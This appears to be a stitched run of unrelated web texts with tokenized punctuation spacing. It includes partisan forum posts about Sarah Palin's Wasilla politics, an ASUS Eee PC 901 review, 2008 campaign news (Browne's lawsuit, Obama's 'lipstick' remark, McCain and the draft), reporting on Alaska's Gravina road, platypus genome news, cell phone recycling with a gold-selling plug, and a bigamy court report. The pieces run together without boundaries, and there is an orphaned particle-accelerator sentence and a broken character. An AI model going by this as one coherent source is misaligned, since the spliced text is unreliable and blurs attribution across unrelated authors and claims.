Our local ham radio club did n't like this idea as our antennas work better the higher they are , the FCC allows us 200 ' , local government doens't really get to restrict this anyway as ruled by the FCC in PRB - 1 but the Stein gang was going ahead with this plan and being outside the city , we did n't get to direct say in the matter .
When asked about the matter , we were told that we were just a bunch of " boys playing with toys " and our concerns were beneath their consideration - never mind that the Millers Reach fire had once again proven that ham radio was of great value when the normal communications systems crashed .
The voting population of Wasilla had been cowed into accepting this as the status quo and nothing was ever going to change as Wasilla evolved into a typical little Stepford town .
I was involved at the time with the 2 factions , the anti-annex group and the radio club , and we all wanted to support basically anyone but Stein .
So here comes Sarah Palin .
None of us knew her from Eve , but she stated on the radio that she was not going to persue any annexation unless the property owners actually asked the city and when contacted by the radio club , she nixed the idea of height restrictions .
I did n't actually get to vote but I knew folks who did and we lobbyed those voters one on one as much as we could , word of mouth , neighbor to neighbor , friend to friend .
The opposition at first did n't take her seriously .
When she started to gain traction , they pointed out her lack of experience .
When that tactic did n't work , they went for the scare , telling the voters that she was going to destroy all the progress Wasilla had made ..... and when Stein lost by a landslide , he skulked out of town and has never resurfaced locally .
There has been no forced annexation , no height restrictions , the pro-commerce path she set Wasilla on has brought us ( for good or bad ) Generica in the form of WalMart , Lowes , Home Depot , etc , and she had the vision to bring Wasilla a multi use complex for sports , trade shows , community events , that did n't exist before .
So there you go , Palin knows how to put a finger in the eye of established old boy networks and make government work for the citizens and not the other way around .
One last comment .
Alaskans do n't need the affirmation and adulation of others , which is why the MSM is having such a hard time dealing with her .
She 's an Alaskan and could really give 2 moose turds about what the press thinks - and it 's killing them inside .
It 's all words and we know that .
She does n't need their approval .

Thanks for your very well - written and well informed post .
I think that it is interesting how back then , when she DIDN ’T have much experience ( other than PTA and City Council I think ) she was still elected .
I think when folks see someone with the core values that they have about something ( development , property rights , spending , etc. ) and that the person is compassionate about them , that compassion will be a huge deal - regardless of the experience .
There was a post awhile back on FR about the sports facility and some “ bungled ” land deal that they said cost the town a whole bunch of money , raised their taxes , etc .
It sounds to me that the taxes are lower , and folks are happy .
Any knowledge of the truth about that land deal ?

Thanks for the heads up on the formatting - I apologize for that , I did n’t realize that I had to tag my breaks .
The sports center land deal is another one of those either you lover Sarah or hate her deals .
As usual , follow the money and see whose toes she stepped on .
Troopergate , AGIA , sports center - she does what she believes is correctand in the end sends the power brokers off to the corner with a box of kleenex and the advice to come back when you feel better .

Build and Design
Like the original Eee PC , the designers at ASUS had no easy task creating an attractive ultraportable notebook while also making it cheap to produce .
Customers also indicated that they wanted a larger screen and a larger touchpad , so both of these features had to be incorporated into a very small footprint .
The chassis seams match up with reasonably tight tolerances , plastics feel thick ( though the pearl - like white plastics look cheap ) and the display hinges are molded into body with the battery .
Overall , the Eee PC 900 is almost identical to the original Eee PC .
The only obvious differences are the larger screen and the slightly deeper dimension ( front to back ) in order to accommodate the larger touchpad .
Lifting the display cover you find the same amazingly small keyboard surface found on the original Eee PC .
In short , the build quality is quite high despite the low cost .

The design of the original Eee PC was something truly unique in the market .
Weighing in at just two pounds and delivering a performance level similar to a full - featured budget notebook , the only notebook that came close to " directly " competing with the Eee PC in 2007 was the Fujitsu LifeBook U810 tablet PC … which retailed for more than $ 1,000 last year .
After the success of the original Eee PC , other manufacturers have started to flood the market with low cost mini notebooks .
The Eee PC is n’t the only kid on the block anymore , which is why Asus is trying to raise the bar with the Eee PC 900 .
Screen
The Eee PC 901 ( like the Eee PC 900 ) features a nice 8.9 - inch display with 1024 x 600 resolution .
While this might not be the most impressive resolution we ’ve seen , it ’s much nicer than the native 800 x 480 resolution on the original Eee PC 4G .
Still , many owners of the original Eee PC 4G use modified display drivers to scale 1000 x 600 or higher resolutions on the original Eee PC … so this higher resolution screen is n’t as impressive as it could be .

In any case , the screen on our review unit was free from any problems such as stuck pixels and color and backlighting were both excellent .

Operating System and Software
Unlike the original Eee PC , this configuration of the Eee PC 901 does n’t come with Linux .
This notebook comes pre-installed with Windows XP .
While XP might not be the most modern operating system on the market , XP is still one of the most robust and stable versions of the Windows OS .
Most importantly , Windows XP does n’t have massive system requirements … so it still runs fast on a relatively under - powered notebook like the Eee PC 901 .
Speakers
ASUS received some criticism over the speakers on the original Eee PC because of there massive size located on both sides of the screen .
The bezel around the screen on the Eee PC 901 is much thinner than the thick bezel on the original Eee PC and the speakers have been relocated to the bottom of the notebook .
Speaker output quality is good , but because of the location of the speakers the sound is quite muffled when you ’re using the Eee PC 901 as a " laptop . "
Keyboard and Touchpad
Most low - priced notebooks currently on the market feature poorly built keyboards that show significant flex / bounce when typing pressure is applied .
Much to our surprise , the keyboard on the Eee PC 901 ( like the original Eee PC ) is remarkably firm , though the keys are small and have a large degree of " wiggle " when pressed .
( view large image )
The keyboard on the Eee PC 901 is very , very compact .
The first few days spent typing on this keyboard probably will be quite frustrating as the small footprint and tiny keys require you to use a " hunt and peck " style of typing rather than traditional touch typing methods .
This means that passwords get mangled , emails look like gibberish , and playing games that require keyboard commands becomes quite aggravating .
Of course , once I got used to typing on the tiny keyboard the keys felt just fine … but this keyboard is n’t designed to be used as a primary / main computer .
For users who would buy this notebook as their " main computer " in their home or office , a full - size keyboard and external mouse are recommended .

The touchpad and with dual buttons are easy to use and responsive .
The Eee PC 901 actually has a slightly larger touchpad button than the previous Eee PC 900 which makes it much more comfortable to use than the original Eee PC .
ASUS also includeed several hotkeys for quick access to functions such asbuilt - in screen off , screen resolution , power mode ( power saving , auto high performance , high performance , and super performance ) , and Skype .

Performance
Overall , the Eee PC 901 is a snappy little budget notebook .
The new Intel Atom 1.60 GHz ultra-low voltage processor does n’t have the performance of a modern Core 2 Duo processor but provides a nice browsing experience .
The flash - based storage drives on the Eee PC 901 help with performance since they provide virtually instant data access times .
One odd issue that we encountered with our review unit was that the Eee PC 901 produced a remarkably low PCMark05 synthetic benchmark .
PCMark05 generally provides an accurate indication of overall system performance , but the Eee PC 901 produced a score much lower than its " real world " performance .
It ’s also worth mentioning that the last Atom - based notebook we reviewed in our office ( the MSI Wind ) was unable to run PCMark05 at all .
Synthetic benchmark issues aside , the Eee PC 901 provides plenty of performance for travel and short - term use , but this mini notebook is n’t designed to be a primary computing workhorse .
PCMark05 measures overall system performance ( higher scores mean better performance ) :
Notebook PCMark05 Score ASUS Eee PC 901 ( 1.60 GHz Intel Atom ) 746 PCMarks

If you open the bottom panel on the Eee PC 901 you ’ll find a standard DDR2 RAM slot and a PCI - E mini card slot .
The PCI - E mini card slot in the Eee PC 901 uses the same 8 GB SSD module found in the Eee PC 8G .
Again , in order to reach the 12GB storage capacity on this notebook ASUS essentially just combined the Eee PC 4G and 8G : the motherboard has 4GB of flash storage soldered to it and the PCI - E mini card slot has a 8 GB flash storage module .

Heat and Noise
Even with the low voltage processor and SSD drives , the ASUS Eee PC 901 produced an incredible amount of heat .
While the temperatures did n’t get as hot as some mini notebooks we ’ve reviewed , the 901 did produce hotter temperatures than the MSI Wind .
The bottom of the notebook got quite hot even under normal use .
Fan noise was among the quietest we ’ve heard .
The only way to tell the fan is blowing is to put your hand next to the air vent to feel the warm air blow past .
Below are heat overlay images showing where the Eee PC 901 warmed up ( in degrees Fahrenheit ) during normal extended use :

Wireless
Unlike previous Eee PCs that used an Atheros AR5BXB63 wireless module for 802.11b/ g wireless Internet access , the Eee PC 901 uses a 802.11b/g/n from Ralink .
Reception is quite good for a budget notebook .
The Eee PC 901 maintained a connection to my home router from anywhere inside my three - level home and from anywhere in my front or back yard .
At the editorial offices for NotebookReview.com the Eee PC 901 managed to stay connected to the office router even after I left the building and walked across the parking lot .
Battery
Under normal use , in " Super Performance " mode , backlight at 100 percent and using wireless for web browsing and typing a text document , the Eee PC 901 managed to deliver more than 4 hours of battery life ( 4 hours and 13 minutes ) with the standard battery .
Needless to say , this was rather impressive .
The original Eee PC 4G was able to deliver more than 3 hours of battery life with a smaller screen and weaker processor .
Fortunately , unlike the Eee PC 4G and Eee PC 900 , the battery meter was accurate and always indicated when the power adapter was unplugged and gave correct estimates on battery life .
Conclusion
Last year our editorial staff was absolutely amazed by the original Eee PC .
The original Eee PC finally delivered something that many consumers have wanted since laptops first arrived on the market : an extremely portable laptop with reasonable performance for travel at an extremely low cost .
The new Eee PC 901 is an impressive update to the Eee PC line , but we have trouble getting excited about this mini notebook
The problem is that the budget mini notebook market has exploded in recent months , with many capable alternatives on the market .
Worse still is the fact that ASUS itself has already trumped the 901 with the new Eee PC 1000 series notebooks .
The Eee PC 901 is still an impressive mini notebook or " netbook " for your travel needs , but we hesitate to recommend this particular notebook over the newer Eee PC 1000 H which features a larger keyboard , larger screen , and a larger capacity traditional hard drive .
If you want a smaller Atom - based notebook then the Eee PC 901 still might be a better choice than the Eee PC 1000H , but we suspect most consumers would rather have the slightly larger screen and keyboard found on the latest Eee PC notebooks .
In short , if you ’re in the market for a low cost travel notebook the original Eee PC 901 is still a great notebook … but you may find even better options from ASUS if you shop around .
Pros
Small and light
Reasonably well built and durable
Flash - based storage
Intel Atom processor surprisingly capable
Surprisingly acceptable battery life
Cons
Impressive , but ASUS already has several superior Eee PC models on the market
12GB of storage is n’t a single drive ( one 4GB drive and one 8 GB drive )

NEW YORK ( Billboard ) - Singer - songwriter Jackson Browne is suing Republican presidential nominee John McCain and the Republican party for using his song “ Running on Empty ” in a recent TV commercial .
In the suit , filed in U.S. District Court in Los Angeles , Browne claims McCain and the party did not obtain permission to use the song for an ad in which “ Senator McCain and the Republicans mock Democratic candidate for president Barack Obama for suggesting that the country conserve gas through proper tire inflation . ”
Browne , a lifelong Democrat , is seeking unspecified damages as well as a permanent injunction prohibiting the use of “ Running on Empty ” in any form by the McCain campaign .
“ Not only have Senator McCain and his agents plainly infringed Mr. Browne ’s copyright in ‘ Running on Empty , ’ but the federal courts have long held that the unauthorized use of a famous singer ’s voice in a commercial constitutes a false endorsement and a violation of the singer ’s right of publicity , ” Lawrence Iser , Browne lawyer , said .

Graham Linehan sez , " Geoffrey Perkins died yesterday .
Terrible loss , but I think of interest to Boing Boing readers because of his importance in the ' Hitchhiker 's Guide to the Galaxy ' story …he produced the radio series , and after working with him on ' Father Ted ' , I feel confident in saying that he was probably one of the reasons it became such a huge success .
He was an incredibly influential figure in British television comedy –something his skeletal Wikipedia entry does n't quite communicate–and I just thought people should know that we lost someone very important yesterday . "
Geoffrey was the man who found our early ' Ted ' script , ( at that time , written as a mock - documentary ) and suggested we turn it into a sitcom .
He was the man who chose the house that became our iconic central location ( poring over a pile of location photographs , stabbing it with his finger and saying " That 's the one " ) .
He also persuaded us to use Neil Hannon 's ' Songs of Love ' as our theme music .
This last one was a sticking point for a while .
Arthur and I preferred a song by Neil that would later become ' A Woman of the World ' off the ' Casanova ' album .
That song was jaunty and silly and to us perfect in that it seemed to be subtly making fun of the form we were working in .

Here ’s a tip that will not only help you increase your vehicle ’s fuel economy , but will also help you become a much safer driver :
Follow the “ 3 Second Rule ”
As you are driving down the road – particularly at highway speeds – make sure that you give keep plenty of space between your car , truck , SUV , etc. and the vehicle in front of you .
In most cases , you are giving proper spacing if you are traveling three seconds behind the car in front of you , however , you will likely need to give more time and space if you ’re driving in bad weather .
For those of you who do n’t know how to tell how close you are traveling to the car in front of you , pick a set object up a head – an exit sign , a light pole , etc. – and once the bumper of the car you ’re following crosses the designated object , begin counting and do n’t stop until the hood of your car passes the same object .
Following the “ 3 Second Rule ” will help keep you from constantly tapping your brakes and accelerator every time the car in front of you slows down and speeds up .
By avoiding tap dancing on your brake and accelerator pedals , you can significantly increase your fuel economy .
Here ’s why :
By tapping your brakes , you essentially waste the energy it took to get up to and maintain the speed at which you were traveling .
Then ,
In order to get back up to your previous speed , you ’ll need to hit your accelerator , which , obviously , will take some energy .
This energy – both the wasted energy and the newly required energy – came from or will come from the burning of your car ’s fuel .
If you leave plenty of space between you and other drivers , you ’ll give yourself time to adequately judge whether you actually need to use your brakes , or if you can just ease off the accelerator and coast for a short while .
If you coast , you ’ll still lose some of the initial energy and will still have to use fuel to get back up to the previous speed , but it wo n’t be nearly as much as if you had used your brakes .
Using less fuel tends to mean better gas mileage !
And , in terms of safety , by having plenty of space between you and the car ahead of you , you ’re much more likely to avoid a serious accident because you ’ve given yourself enough time to either come to a stop , or make the proper “ evasive maneuver . ”
The European Commission has recently decided to reserve , across Europe , part of the radio spectrum for smart vehicle communications systems .
The decision is part of the commission ’s overall fight against road accidents and traffic jams , and the hope is that vehicles ’ developers will create wireless communication technology that will allow cars to “ talk ” to other cars and to the road infrastructure providers .
Wireless communication
in cars could reduce car accidents
Using wireless communication cars could , for example , warn other drivers of slippery roads or of a crash which just happened .
Smart vehicle communication systems have the potential to make the lives of Europe ’s drivers safer and easier ; according to the European Commission , in 2006 more than 42,000 people died in road accidents in the European Union and more than 1.6 million were injured .
One of the steps towards reducing the number of accident victims is this latest decision , which intends to foster investment in smart vehicle communication systems by the automotive industry .
Furthermore , the commission hopes to spur public funding in essential roadside infrastructure .
The decision made is to provide a single EU - wide frequency band that can be used for immediate and reliable communication between cars and between cars and theroadside infrastructure .
It is 30 MHz of spectrum in the 5.9 Gigahertz ( GHz ) band which will be allocated within the next six months by national authorities across Europe , improving road safety applications without barring other services already in place ( such as amateur radio services ) .
Numerous examples show why drivers could benefit from the new frequency .
For instance , information about a sudden road closure could be transmitted to drivers in the area , so they could change their course via a detour .
Furthermore , information about maintenance works , malfunctioned traffic lights , and other traffic - changing events could be sent as well .
“ This Commission decision is a decisive step towards meeting the European goal of reducing road accidents .
Getting critical messages through quickly and accurately is a must for road safety , ” said Viviane Reding , EU Telecoms Commissioner .
“ We should also keep in mind that with 24 % of Europeans ’ driving time spent in traffic jams the costs caused by congestion could reach € 80 billion by 2010 .
So clearly saving time through smart vehicles communications systems means saving money . ”
TFOT has also covered Ford ’s new blind spot mirror , which has an integrated convex spotter mirror aimed directly at the vehicle ’s blind spot , meant to protect drivers and prevent accidents , and the Smart Mover , which is one of the most realistic racing simulators in the world .

Updated NORFOLK , Va. — Senator Barack Obama accused his Republican rivals on Wednesday of stirring “ phony outrage ” over a colloquial comment he made one day earlier about putting “ lipstick on a pig , ” which he said was a clear reference to Senator John McCain ’s policies not a derogatory slur against his running - mate .
“ Enough ! ” Mr. Obama said , interrupting a speech on education to address the latest controversy in the heated presidential campaign .
“ I do n’t care what they say about me , but I love this country too much to let them take over another election with lies and phony outrage and swift boat politics .
Enough is enough . ”
In southern Virginia on Tuesday night , Mr. Obama was delivering a spirited attack about Mr. McCain ’s pledge to change Washington , likening the approach to trying to put lipstick on a pig .
( “ It ’s still a pig , ” he said to loud applause . )
The comment instantly caught fire , with associates of Mr. McCain suggesting it was a degrading remark aimed at Gov. Sarah Palin , the Republican vice presidential candidate .
The Obama campaign , which has already been grappling with how to deal with the newfound popularity of Ms. Palin , responded forcefully in a statement .
But aides said the controversy would almost certainly not blow over unless Mr. Obama addressed it directly , which he did in the opening minutes of a campaign event in a high school library .
“ What their campaign has done this morning is the same game that has made people sick and tired of politics in this country .
They seize on an innocent remark , try to take it out of context , throw out an outrageous ad because they know it ’s catnip for the news media , ” Mr. Obama said .
“ I ’m assuming you guys heard this watching the news .
I ’m talking about John McCain ’s economic policies and I said here ’s more of the same , ‘ You can put lipstick on a pig , but it ’s still a pig .
Suddenly , they say , Oh you must be talking about the governor of Alaska ! ' ”
As the audience applauded , he added : “ See it would be funny , it would be funny except , of course the news media decided that was the lead story yesterday .
The McCain campaign would much rather have the story about phony and foolish diversions than about the future . ”
By devoting a little more than five minutes to the lipstick controversy , Mr. Obama said he was finished discussing the matter and return to issues that Americans are concerned about .
( Time will tell , of course , if this really is the final word on the subject . )
“ Spare me the phony outrage .
Spare me the phony talk about change , ” Mr. Obama said .
“ We have real problems in this country right now and the American people are looking to us for answers , not distractions , no diversions , not manipulations . ”
Update , 8:41 p.m. : On “ The Late Show With David Letterman ” on Wednesday night , Mr. Obama offered a light - hearted explanation , saying : “ Technically , had I meant it this way — she would be the lipstick , you see .
The failed policies of John McCain would be the pig . ”
Brian Rogers , a spokesman for the McCain - Palin campaign , chastised Mr. Obama for trying to blame the media for reporting the lipstick remark , rather than taking responsibility himself .
“ Barack Obama ca n’t campaign with schoolyard insults and then try to claim outrage at the tone of the campaign , ” Mr. Rogers said in a statement .
“ His talk of new politics is as empty as his campaign trail promises . ”
The 3.2 - mile - long partially paved “ road to nowhere ” meanders from a small international airport on Gravina Island , home to 50 people , ending in a cul - de - sac close to a beach .
Crews are working to finish it .
But no one knows when anyone will need to drive it .
That ’s because the $ 26 - million road was designed to connect to the $ 398 - million Gravina Island Bridge , more infamously known as the “ bridge to nowhere . ”
Alaskan officials thought federal money would pay for the bridge , but Gov. Sarah Palin killed the project after it was ridiculed and Congress rescinded the money .
Plans for the road moved forward anyway .
Some residents of Ketchikan -- a city of 8,000 on a neighboring island where the bridge was to end -- see the road as a symbol of wasteful spending that Palin could have curtailed .
Some of them even accuse her of deception .
Advertisement
“ Surely we wo n’t have to commute on the highway if there wo n’t be a bridge , ” said Jill Jacob , who has been writing and calling the governor ’s office for the last two years to protest the road .
“ It ’s a dead - end highway , a dead - end road . ”
Since Palin was named the Republican vice presidential nominee two weeks ago , she has been boasting that she told Congress that Alaska did n’t want the hundreds of millions that had been earmarked for the bridge .
But in 2006 , Palin stood before residents in this region during her gubernatorial campaign and expressed support for the bridge .
It became apparent after she was elected that the state ’s portion would be too costly , and Palin ordered transportation officials to abandon the project .
She held on to the $ 223 million in federally earmarked funds for other uses , such as the Gravina road , approved by her predecessor .
Advertisement
“ Here ’s my question , ” said Ketchikan Mayor Bob Weinstein .
“ If Sarah Palin is not being truthful on an issue like the Gravina bridge project , what else is she not being truthful about ? ”
Alaska transportation officials say construction of the road began in June 2007 because the state was still hoping to build a bridge , and “ you need that highway access , ” said Roger Wetherell , a department spokesman .
But Weinstein , who backed the bridge project , said that Palin should have redirected the money .
“ If the bridge was canceled , give the money back , or get the earmark removed , or redesign the road so it ’s better for development , ” he said .
“ Especially if you ’re opposed to earmarks , and now you ’re telling the world you ’re opposed to earmarks . ”
His frustration came to a head after he heard Republican presidential nominee John McCain and Palin tout her reputation as a reformer focused on saving taxpayer money .
He did n’t feel much better when a campaign ad called them “ the original mavericks , ” and said : “ She stopped the ‘ bridge to nowhere . ’ ”

Weinstein need only glance across the salmon - rich waters separating his city from Gravina Island to see what he believes are millions of dollars being spent unnecessarily .
Why , he asks , did n’t she stop that ?
Geographic limitations
Ketchikan is on Revillagigedo Island , about 35 miles wide and 55 miles long , a stretch of rugged hills , mountains and spruce .
Residents talk of reaching into the clear water and grabbing wriggling salmon with their bare hands .
Locals drink rainwater , rarely use umbrellas and hide their garbage from black bears .
It is a place where many residents own boats , and the 600 - student high school mascot is the king salmon .
It started as a fishing enclave of Alaska Natives , then white settlers built a thriving logging industry .
But the city ’s last major pulp mill shut down in 1997 , and nearly 500 jobs were lost .
Advertisement
“ Ten percent of our economy disappeared overnight , ” Weinstein said .
“ That ’s why projects like the Gravina access project became all the more important . ”
Tourism is now Ketchikan ’s main source of income , with 1 million visitors annually .
Between May and September , cruise ships the size of stadiums -- often several at a time -- stop daily , unleashing passengers to admire the abundance of totem poles and stop at the dozens of stores selling necklaces and earrings made of gold nuggets and violet - blue tanzanite .
Todd Phillips and his wife , who own a shop on Main Street , moved here from Denver 11 years ago because they liked the region ’s tranquillity and entrepreneurial potential .
But the city needs to grow , he said , adding that Palin was right on the bridge issue “ in the beginning , and she should have followed through with it . ”
Now , Phillips said , “ we feel like we just do n’t count .
We ’re just a forgotten dot . ”

Ketchikan , with its vast stretches of protected wetlands and forests , has little room to grow .
About a quarter - mile across the Tongass Narrows waters sits the mostly flat and vacant Gravina Island , about 21 miles long and 10 miles wide , and ripe for commercial and residential development .
A 10 - minute ferry boat ride takes passengers and their vehicles from one island to the other .
There are no freeways to the mainland for island communities in this region , so people must travel by water or air , which makes the airport on Gravina Island an essential transportation hub for people throughout southeastern - most Alaska .
“ To facilitate economic growth [ on Gravina ] , we have to be able to actually get there , ” said Thomas Williams , planning director for the Ketchikan Gateway Borough .
“ Until there is an actual road to transport goods and materials , growth is not possible . ”
The bridge was championed by Sen. Ted Stevens and Rep. Don Young , both Republicans , who pushed the project through Congress in 2005 using earmarks -- the controversial practice used by lawmakers to slip targeted spending into bills without public scrutiny .
But that earmark quickly became the target of widespread public criticism and was labeled the “ bridge to nowhere . ”
Members of Congress eventually stripped the funds that had been designated for the bridge from a larger spending bill , but allowed Alaska to keep $ 223 million for other needs .
Advertisement
After that decision , according to a front - page article in the Ketchikan Daily News , Palin said during a Ketchikan Chamber of Commerce meeting : “ The money that ’s been appropriated for the project , it should remain available for a link . . . to help this community prosper . ”
‘ A creeping suspicion ’
Mike Elerding ran Palin ’s campaign for governor in Ketchikan , and she won the vote here .
But when Palin took office , he said , locals began to get a “ creeping suspicion that maybe she did n’t mean all that she said . ”
In September 2007 , Palin canceled the bridge project , blaming a funding shortage and lack of congressional support : “ Ketchikan desires a better way to reach the airport , but a $ 398 - million bridge is not the answer , ” she said in a statement .
Advertisement
“ We ’re feeling a little bit caught in the middle , ” Elerding said recently .
“ We ’re proud she ’s getting national recognition , but we ’re also feeling betrayed . ”
Susan Walsh , a nurse who lives on Gravina Island , remembers attending that Chamber of Commerce meeting .
When Palin withdrew her support for the bridge , Walsh figured the road project would have died with it .
“ It was just stupid , ” she said .
Jacob , the woman who has been protesting the road for two years with a letter - writing campaign on behalf of the Tongass Conservation Society in Ketchikan , says : “ We begged her to stop . ”
An April 2007 letter to Palin read : “ I am writing to encourage you to do away with the Gravina Access Highway .
At about $ 8 million per mile of public money , this is a fiscal mistake . ”

State officials said alternatives to the $ 398 - million bridge could include improved ferry service or less costly bridges that would link to the Gravina road .
“ Gov. Palin understood that a more cost - efficient , sensible solution could still be implemented ” in place of the original bridge plan , said Maria Comella , a spokeswoman for Palin ’s campaign .
On a clear day recently , Mayor Weinstein flew over Gravina Island , looking down on the nearly completed road .
“ When Sarah Palin goes on national television and says : ‘ I told Congress , “ Thanks but no thanks , ” ’ it ’s not true , ” he said .
“ The implication is we did n’t take the money .
But we did . ”
The mayor said he was considering posting a sign on the road for the rest of the world to see .
He said it would read : “ Built Under Gov. Sarah Palin , Paid for With Federal Earmarks . ”

The road : a timeline

Nov. 16 , 2005 : After mounting pressure over pork - barrel projects , Congress eliminates the earmark stipulating that $ 223 million destined for Alaska be spent building a bridge connecting Ketchikan to its airport on Gravina , a neighboring island that has 50 residents .
Congress allows Alaska to keep the money and leaves it to the state to decide how to spend it .
Sept. 21 , 2006 : While running for governor , Palin tells Ketchikan residents , according to the Ketchikan Daily News :
“ The money that ’s been appropriated for the project , it should remain available for a link . . . to help Ketchikan expand its access to help this community prosper . ”
Oct. 2 , 2006 : Palin is quoted in the Ketchikan Daily News :
“ We need to come to the defense of southeast Alaska when proposals are on the table like the bridge and not allow the spin-meisters to turn this project or any other into something that ’s so negative . ”
Nov. 7 , 2006 : Palin is elected governor .
Advertisement
June 2007 : Alaska diverts much of the $ 223 million to other projects .
Construction on a 3.2 - mile “ road to nowhere ” begins .
Alaska officials say they went forward with the $ 26 - million Gravina highway , designed to connect to the bridge , because if they had n’t , they would have had to return the money to the federal government .

At first dismissed as a prank , and later cited as proof that God has a sense of humour , the duck - billed platypus has finally given up its evolutionary secrets .
The creature , considered one of the strangest mammals in the world , has become the latest to have its genetic code sequenced , revealing it to be a bizarre mix of mammal , bird and reptile , with very complex sexuality .
While humans have two sex chromosomes , the X and Y , the platypus has 10 , with five of each kind .
An international team of scientists extracted DNA from a female platypus , named Glennie , reading all 2.2bn pairs of her genetic " letters " .
Thought to have begun to diverge from other mammals 170 m years ago , the platypus has been regarded as the nearest thing biologists have to a missing link between the earliest reptiles and mammals .
It has thick fur and produces milk for its young , yet the females lay eggs and the males produce venom - the only mammals to do so .
When first discovered in Australia in 1798 , the beaver - tailed animal caused such bemusement that the zoologist George Shaw declared it could well be a hoax .
The new study , published in Nature , shows the platypus as both evolutionary relic and pioneer .
Chris Ponting , at the Medical Research Council 's functional genomics unit at Oxford University , said scientists had had the first chance to see if the platypus 's weird appearance was reflected in its DNA : " Lo and behold , we saw genes like those in lizards and birds , as well as some like those in other mammals .
It has retained many genes other mammals lost from a time when all mammals looked much like lizards . "
Many of the animal 's stranger characteristics are now thought to have evolved independently .
The venom , which is released from the male 's hind leg spurs , is thought to have developed late in the animal 's history .
And the remarkable electrosensitive bill , which helps the platypus hunt underwater while its eyes and ears are covered , appeared long after the platypus split from its reptilian ancestors .
The fact that the animal has five X and five Y chromosomes is " the weirdest thing about a very weird animal , " said Ewan Birney , a co-author on the paper , based at the European Bioinformatics Institute , near Cambridge .
" In theory it means there are 25 possible sexes , though in practice that does n't happen . "

There are many possibilities of what could be discovered because it's the most powerful particle accelerator to ever be created by humans .

Yesterday , John McCain intimated — quite strongly — that he supports the draft .
Jed edited the video to the salient part .
Sure sounds like McCain thinks we need a draft .
But why believe what McCain says ?
According to Marc Ambinder that comment gave us liberals a “ conniption . ”
See , Marc Ambinder , who knows John McCain , claims John McCain does n’t support the draft .
Unlike the rest of us , Marc Ambinder gets to see McCain in person and he ’s heard it for himself .
So , even when McCain says things about supporting the draft , like McCain did Wednesday , Marc Ambinder knows McCain does n’t mean it .
Now , the reality is that McCain has n’t been as clear as Marc Ambinder claims .
While the reporters who have gotten to know John McCain might not grasp this , just because McCain said something , does n’t mean it ’s true .
He changes his positions and says different things to different audiences .
Last night , despite Ambinder and McCain ’s campaign ’s claims to the contrary , Olbermann said McCain has been “ anything but clear or consistent in opposing the draft . ”
And , when it comes to this issue , I ’ll trust Jon Soltz from VoteVets who said McCain ’s plan “ equals the draft ” :
This article is all about explaining how lucrative cell phone recycling is , its impact on the conservation of limited resources .
Cell phone recycling gold in your cell phone .
This is a continuation of our series on cell phone recycling , and today , let ’s examine how lucrative cell phone recycling is , how much impact it has on the conservation of limited resources , and why many people consider cell phone recycling a win -win solution for everyone .
Picture this .
Seventeen cars piled on top of each other .
How heavy do you think this huge car pile is ?
Assuming the cars weigh at least a ton each , that ’s 17 metric tons of steel , glass , plastic , and rubber .
Now let ’s change the picture a bit .
Imagine another pile , also weighing 17 metric tons , made of gold ores .
Yes , ores .
Rocks with traces of gold in them .
This rock pile will be smaller in volume but will have the same weight as the car pile .
How much gold do you think can be extracted from 17 metric tons of gold ores ?
Depending on the source from which the ores are mined , a ton of gold ore could yield 0.3 to 5 grams of gold per metric ton .
We ’re talking about extracting .51 to 85 grams of gold from the our hypothetical ore pile .
Now imagine a much smaller pile weighing just 1 metric ton of cell phones .
One ton .
Did you know that gold and other precious metals can be recycled from your your cell phone ?
Compared to the mountainous pile of 17 tons of gold ores , more gold can be recovered from this heap during cell phone recycling than what can be extracted from 17 tons of gold ores .
A ton of cell phones can yield as much as 280 grams of gold , about 140 grams of platinum and palladium , and 140 kilograms of copper .
There ’s also plastic and glass that can be recycled from used cell phones .
�
And all this without the waste by - products of traditional gold mining and refining .
We ’re talking about heavy metals and dangerous chemicals like cyanide , that are normally used or produced during the process of mining and refining .
There ’s also the geological disturbance – destruction of forests , and ecological niches to make way for gold mines .
Cell phone recycling is done on a huge scale by such companies as Umicore in Belgium , which process unserviceable cell phones and other e-waste , to “ surface - mine ” precious metals and other materials like gold , silver , platinum , copper , coltan , plastic and glass , etc .
The good news is , after the entire recycling process is over , less than half of 1 % of the entire electronic waste processed , is deemed unfit to be returned to the production cycle and is then just burned for energy generation .
The precious metals present in each cell phone are basically just trace amounts , so it ’s impractical and patently dangerous ( because of the industrial chemicals necessary ) for you to try and extract these metals from your cell phone at home .
It may seem like a joke , but it was in the news last month – a man who fancied himself as an “ urban miner ” got poisoned by the industrial chemicals he was using , while “ mining ” cell phones .
The giant recycling firms make money by processing tons and tons of cell phones and other electronic waste .
Gold , copper , and platinum are finite resources that will be exhausted in a few years , based on our current rate of extraction .
Cell phone recycling offers a viable conservation option as well as a clear positive impact on environmental protection .
It ’s a win -win option for everyone concerned .
The recyclers win in terms of revenues from the recycled precious metals .
The cell phone makers win by being assured of a steady stream of raw materials for years to come , ensuring a stable production cost of new products .
All of us win in cell phone recycling , by having affordable modern gadgets made available to us and by minimizing the environmental impact of precious metals extraction .
On the top of gold I may mention that you can sell scrap gold easily online at PaceButler Gold .

Husband exposed as a bigamist when shocked fourth wife opens divorce letter from third
Serial husband : Cheal Sweetman has been sentenced to 11 weeks in prison , suspended for 18 months
A woman discovered she was married to a bigamist when she opened a letter issuing divorce proceedings from her husband 's third wife .
Cheal Sweetman , 39 , married Juliet Bond on December 31 , 2004 , even though his third marriage to Amanda Madden had not been dissolved .
The Aylesbury Aylesbury Crown Court heard that Ms Bond discovered the bigamy last year , some time after she had separated from Sweetman .
The letter from Ms Madden 's solicitors spelled out her concern that she was not formally divorced from Sweetman .
It was then that Ms Bond reported the bigamy to police .
In a written statement to the court , she described how the revelation about her marriage had been life - changing .
' I can not move forward with my life at this time as I do not know if I am married to the defendant , ' Ms Bond said .
Deputy Circuit Judge Roger Conner told Sweetman , that people like him posed a threat to ' one of the building blocks of society ' .
He sentenced the 39 - year - old from High Street , Chesham , Buckinghamshire , to 11 weeks in prison , suspended for 18 months .
' You must have known you were misleading the registrar about the fact that you were married to your third wife , ' Judge Conner said .
Prosecutor Richard Moss said : ' The defendant told Juliette he had been married three times before but believed his marriage to Amanda had been dissolved .
' Having sent a petition to the county court for divorce , he assumed he was divorced . '
Martin Hooper , defending Sweetman , told the Judge Connor : ' He should have known from previous experiences that he could not just assume that he was divorced .
' But he went through a ceremony of marriage and a relationship with Juliet for a genuine reason - there was no other motive . '
Mr Hooper also told the court that Ms Bond had been involved in an extra-marital affair and Sweetman subsequently left the family home with ' just a bag of clothes ' .
